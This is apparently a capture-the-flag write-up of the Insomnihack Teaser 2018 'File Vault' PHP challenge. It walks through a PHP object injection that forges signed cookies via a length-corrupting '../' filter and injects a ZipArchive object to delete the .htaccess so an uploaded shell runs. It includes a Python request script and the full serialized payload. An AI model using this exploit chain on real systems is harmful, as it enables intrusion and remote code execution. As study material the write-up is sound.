---
layout: post
title: File Vault
category: Insomnihack Teaser 2018
---

# Description

You can securely store some of your files on our systems, and retrieve some data about them. We guarantee that all of your data are sure!

---

# The Challenge

File Vault is a sandboxed file manager allowing users to upload files and
view file metadata. This challenge has been my favorite during the Insomnihack
Teaser. Even if the source code was provided, this challenge showed a lot of
originality.

As mentionned above, the challenge author provided us with the source code of the
application. A user has access to five actions :

- `home` (viewing the main page)
- `upload` (uploading a new file)
- `changename` (renaming an existing file)
- `open` (viewing the metadata of an existing file)
- `reset` (remove all files from the sandbox)

Each action is executed in the context of a sandbox, a user-specific folder
generated with the following code :

```php
$sandbox_dir = 'sandbox/'.sha1($_SERVER['REMOTE_ADDR']);
```

That sandbox also prevents PHP execution, as shown by the `php_flag engine off`
directive in a generated `.htaccess` file :

```php
if(!is_dir($sandbox_dir))
  mkdir($sandbox_dir);

if(!is_file($sandbox_dir.'/.htaccess'))
  file_put_contents($sandbox_dir.'/.htaccess', "php_flag engine off");
```

## How the Webapp Works

Each uploaded file is represented by a `VaultFile` object in PHP:

```php
class VaultFile {
    function upload($init_filename, $content) {
        global $sandbox_dir;
        $fileinfo = pathinfo($init_filename);
        $fileext = isset($fileinfo['extension']) ? ".".$fileinfo['extension'] : '.txt';
        file_put_contents($sandbox_dir.'/'.sha1($content).$fileext, $content);
        $this->fakename = $init_filename;
        $this->realname = sha1($content).$fileext;
    }

    function open($fakename, $realname){
        global $sandbox_dir;
        $fp = fopen($sandbox_dir.'/'.$realname, 'r');
        $analysis = "The file named " . htmlspecialchars($fakename).
                    " is located in folder $sandbox_dir/$realname.
                      Here all the informations about this file : ".
                    print_r(fstat($fp),true);
        return $analysis;
    }
}
```

When uploading a new file, a `VaultFile` is created with the following
properties :
- `fakename` : The user supplied file name upon upload
- `realname` : An autogenerated name used to store the file on-disk

When viewing a file via the `open` action, the `fakename` is used for display
purposes. The actual file on the filesystem is the `realname`.

The `VaultFile` object is then added to an array, serialized via a custom
`s_serialize()` function and returned to the user through cookies.
When a user wishes to view his files, the web app fetches the user'
s cookie, deserializes the `VaultFile` object via `s_unserialized()`
and processes it accordingly.

Here's is what a `VaultFile` object looks like :
```
a:1:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:4:"asdf";s:8:"realname";s:44:"6322fe412ca3cd526522d9d7fde5f2a383ca4c3f.txt";}}e28cae7d9495e4f9e9c65e268f8ac4d975f4c94e02b04fa1144a9400979dae23
```

And here's the relevant code used to generate the serialized object above :

```php
function s_serialize($a, $secret) {
  $b = serialize($a);
  $b = str_replace("../","./",$b);
  return $b.hash_hmac('sha256', $b, $secret);
};

function s_unserialize($a, $secret) {
  $hmac = substr($a, -64);
  if($hmac === hash_hmac('sha256', substr($a, 0, -64), $secret))
    return unserialize(substr($a, 0, -64));
}

// ...
case 'home':
default:
  $content =  "[Some irrelevant HTML code]";
  $files = s_unserialize($_COOKIE['files'], $secret);
  if($files) {
      $content .= "<ul>";
      $i = 0;
      foreach($files as $file) {
          $content .= "[More HTML code displaying the contents of $file]";
          $i++;
      }
      $content .= "</ul>";
  }
  break;

case 'upload':
  if($_SERVER['REQUEST_METHOD'] === "POST") {
      if(isset($_FILES['vault_file'])) {
          $vaultfile = new VaultFile;
          $vaultfile->upload($_FILES['vault_file']['name'],
            file_get_contents($_FILES['vault_file']['tmp_name']));
          $files = s_unserialize($_COOKIE['files'], $secret);
          $files[] = $vaultfile;
          setcookie('files', s_serialize($files, $secret));
          header("Location: index.php?action=home");
          exit;
      }
  }
  break;
```

At this point, its fair to assume that we're dealing with a PHP object injection
vulnerability, as a user-controlled cookie is being sent straight to the `s_unserialize()` function.

**Note**: I won't go into the details of how object injection works, but here is my go-to reference
on the subject: [Practical PHP Object Injection](https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf)

## s_serialize() and s_unserialize()

Early in the challenge, I assumed that this would be a typical object
serialization challenge. Yet upon reading the source code, I soon understood
why only 5 teams so far solved it.

Firstly, even if the `s_*serialize` functions _do_ accept user-controlled parameters,
the serialied object is signed and validated against a `$secret`. In the event
of an invalid signature in the `s_unserialize()` function, the unserialized
object is never returned :

```
function s_serialize($a, $secret) {
  $b = serialize($a);
  $b = str_replace("../","./",$b);
  return $b.hash_hmac('sha256', $b, $secret);
};

function s_unserialize($a, $secret) {
  $hmac = substr($a, -64);
  if($hmac === hash_hmac('sha256', substr($a, 0, -64), $secret))
    return unserialize(substr($a, 0, -64));
}
```

Therefore, we _can_ pass arbitrary PHP objects to `unserialize()`, but we _can't_
manipulate them since they will never be returned.

Furthermore, the source code doesn't disclose any magic methods such as `__wakeup()`
or `__destruct()`, which means we won't be able to win just with the `unserialize()`
call...

Lastly, even if we did manage to forge properly signed serialized objects, there are
no methods allowing us to arbitrarly read/write files.

## The Bug - Corrupting Serialized Objects

The vulnerability in the application, which makes this challenge so interesting,
is in the following code :

```
function s_serialize($a, $secret) {
  $b = serialize($a);
  $b = str_replace("../","./",$b);
  return $b.hash_hmac('sha256', $b, $secret);
};
```

The author added `str_replace()` call to filter out `../` sequences. The issue
here is that the `str_replace` call is performed on a *serialized object*,
instead of a string.

Why does this matter? Here's a snippet of a serialized array.
```
php > $array = array();
php > $array[] = "../";
php > $array[] = "hello";
php > echo serialize($array);
a:2:{i:0;s:3:"../";i:1;s:5:"hello";}
```

Let's perform the `../` "filter" :

```
php > echo str_replace("../","./", serialize($array));
a:2:{i:0;s:3:"./";i:1;s:5:"hello";}
```

The filtering has indeed changed `../` into `./`, but the size of the serialized
string has **not**! `s:3:"./";` shows a string of size `3`, yet the actual value
has a size of `2`.

When this new corrupted object will be processed by `unserialize()`, PHP
will consider the next character in the serialized object (`"`) as being part
of its value :

```
a:2:{i:0;s:3:"./";i:1;s:5:"hello";}
              --- <== The value parsed by unserialize() is ./"
```

The more `../` you add, the more characters end up being parsed by `unserialize()`.

```
php > $array = array();
php > $array[] = "../../../../../../../../../../../../";
php > $array[] = "hello";
php > echo serialize($array);
a:2:{i:0;s:36:"../../../../../../../../../../../../";i:1;s:5:"hello";}

php > echo str_replace("../","./", serialize($array));
a:2:{i:0;s:36:"././././././././././././";i:1;s:5:"hello";}
               ------------------------------------ <=== Parsed by unserialize()

php > unserialize('a:2:{i:0;s:36:"././././././././././././";i:1;s:5:"hello";}');
PHP Notice:  unserialize(): Error at offset 51 of 58 bytes in php shell code on line 1

Notice: unserialize(): Error at offset 51 of 58 bytes in php shell code on line 1
```

In the context of our challenge, we can reproduce this behavior by renaming
a previously uploaded file with a `../` sequence. The web application will
happily rename and _sign_ a new cookie containing the corrupted object.

## Forging and Signing Arbitrary Objects

Now that we can **sign** corrupted serialized objects, we need to figure out
how to sign _valid_ objects using this bug.

Notice how in the last example above, by adding multiple `../` strings, we
end up overflowing on the next object (`"hello"`) in the array.

In the event where we control the `hello` string, its just a matter
of replacing `hello` with the end of a valid serialized object.
Here's an example :

```
php > $array = array();
php > $array[] = "../../../../../../../../../../../../../";
php > $array[] = 'A";i:1;s:8:"Injected';
php > echo serialize($array);
a:2:{i:0;s:39:"../../../../../../../../../../../../../";i:1;s:20:"A";i:1;s:8:"Injected";}

php > $x = str_replace("../", "./", serialize($array));
php > echo $x;
a:2:{i:0;s:39:"./././././././././././././";i:1;s:20:"A";i:1;s:8:"Injected";}
               ---------------------------------------           --------

php > print_r(unserialize($x));
Array
(
    [0] => ./././././././././././././";i:1;s:20:"A
    [1] => Injected
)
```

As you can see, a new `"Injected"` string has been added to the array upon
deserialization. We used a string in this example `"i:1;s:8:"Injected"`,
but any primitive/object would work here too.

In File Vault, we pretty much have the same situation. All we need is an array
in which we corrupt the first object and we control the second object.

We can achieve this by uploading two files. Just like the example
above, the plan is the following :
- Upload two files, creating two VaultFile objects
- Rename the `fakename` of VaultFile #2 with a partial serialized object
- Rename the `fakename` of VaultFile #1 with enough `../` sequences to
 reach VaultFile #2.

Note that since we're using the normal functionalities of the web app
to do this, we don't have to worry about signing.

### What now?

We are now able to forge our own serialized objects with
arbitrary data.

At this point, the challenge becomes a typical object injection challenge,
with the additional headaches of not having any magic methods or interesting
functions...

So far, we've used pretty much all of the features of the webapp with the exception
of one : `open`. Here is the implementation :
```
case 'open':
    $files = s_unserialize($_COOKIE['files'], $secret);
    if(isset($files[$_GET['i']])){
        echo nl2br($files[$_GET['i']]->open($files[$_GET['i']]->fakename,
                            $files[$_GET['i']]->realname));
    }
  exit;
```

`Open` essentially takes an object from our `$files` array and calls the
`open()` function on it using two parameters : `$object->fakename` and
`$object->realname`.

Knowing that we can inject any object in our `$files` array (as demonstrated
by the `"Injected"` string from earlier), what would happen if we inject
something other than a `VaultFile` object?

The method name `open()` is pretty generic. There's bound to be a standard
class in PHP which has an `open()` method. Since we can inject our own
objects, we also control the parameters of the `open()` call
(`fakename` and `realname`).

Let's list all classes containing an `open()` method :
```
$ cat list.php
<?php
  foreach (get_declared_classes() as $class) {
    foreach (get_class_methods($class) as $method) {
      if ($method == "open")
        echo "$class->$method\n";
    }
  }
?>

$ php list.php
SQLite3->open
SessionHandler->open
XMLReader->open
ZipArchive->open
```

We have four classes which have an `open()` method. If we inject a serialized
object of any one of these classes in our `$files` array, we can call
their method via the `open` action with the parameters of our choice.

Most of these classes manipulate files. Thinking back to our challenge,
the only file that is worth playing around with is the `.htaccess`
preventing us from executing PHP. If we can somehow delete the
`.htaccess` file, we win.

At this point, we can test locally the behavior of each class.
_I_ noticed that the `ZipArchive->open` method **deletes* the target
file if we give a `"9"` as a second parameter (don't ask me why...).

## Getting a shell

Let's develop our final payload.

I created a python script to automate the actions of the web app.

```
#!/usr/bin/env python2

import requests
import urllib

URL = "http://filevault.teaser.insomnihack.ch/"
s = requests.Session()

def upload(name):
    files = {'vault_file': (name, 'GARBAGE')}
    params = { "action" : "upload" }
    s.post(URL, params=params, files=files)

def rename(index, new_name):
    data = { "newname" : new_name }
    params = {
        "action" : "changename",
        "i" : index
    }
    s.post(URL, params=params, data=data)

def open_file(index):
    params = {
        "action" : "open",
        "i" : index
    }
    return s.get(URL, params=params).text
```

Let's prepare our VaultFile objects by uploading two files :
```
upload("A")
upload("B")
```

The webapp will send us the following cookie :
```
a:2:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:1:"A";s:8:"realname";s:44:
"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}i:1;O:9:"VaultFile":2:
{s:8:"fakename";s:1:"B";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3
390db020d7c82b7a.txt";}}ce27b112cf5429bf6f09a905de8f4d110ab1ce6d39f27
d4ec0226ab47c76721a
```

Our malicious partial serialization object will be at the start of the second
`fakename`. The distance between the first `fakename` and the second is 115
characters.

Therefore, to reach `fakename` #2, we need to rename the first
`fakename` with `"../" * 115`. We'll do this later.


---

We'll want to prepare a ZipArchive object to inject in this cookie.
Let's create one:

```
php > $zip = new ZipArchive();
php > $zip->fakename = "sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";
php > $zip->realname = "9";
php > echo serialize($zip);
O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:0:"";}
```

Since our goal is to call `ZipArchive->open(".htaccess", "9")`, we added a `fakename` and `realname` property containing our parameters.

If we inject our object as is, we will be left with a trailing `realname`.
This might clash with the forged `realname` we created above.

```
";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt
```

We can remove the trailing `realname` by updating the size of the serialized
`ZipArchive->comment` parameter. The size of the trailing section is 67,
so we update the `comment` size accordingly.

```
O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"";}
```

---

We now have all the ingredients. Let's rename our second
`VaultFile->fakename` :

```
{% raw %}
# We end the first object with a dummy parameter, then start the second object
# with our ZipArchive
serialized_injection = '";s:1:"e";s:0:"";}i:1;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"'
{% endraw %}

rename(1, serialized_injection)
```

Let's now rename our first `VaultFile->fakename` :
```
newname = "../" * 115 # To overwrite fakename #2
rename(0, newname)
```

In the end, we'll receive the following cookie :
```
a:2:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:345:"./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}i:1;O:9:"VaultFile":2:{s:8:"fakename";s:245:"";s:1:"e";s:0:"";}i:2;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}}6f72e63954ac6e08c3ebc6e4abdff60956a82d9ebc556873410c9ef456098b69
```

Proceed to uploading a shell (which won't be executed as the .htaccess file
has not been deleted yet):
![before_shell](/assets/img/insomnihack-teaser-2018/before_shell.png)

`Unserialize()` the cookie above and trigger the `ZipArchive->open()` function call :
![delete_htaccess](/assets/img/insomnihack-teaser-2018/delete_htaccess.png)

And finally, revisit the shell again!

![shell](/assets/img/insomnihack-teaser-2018/after_shell.png)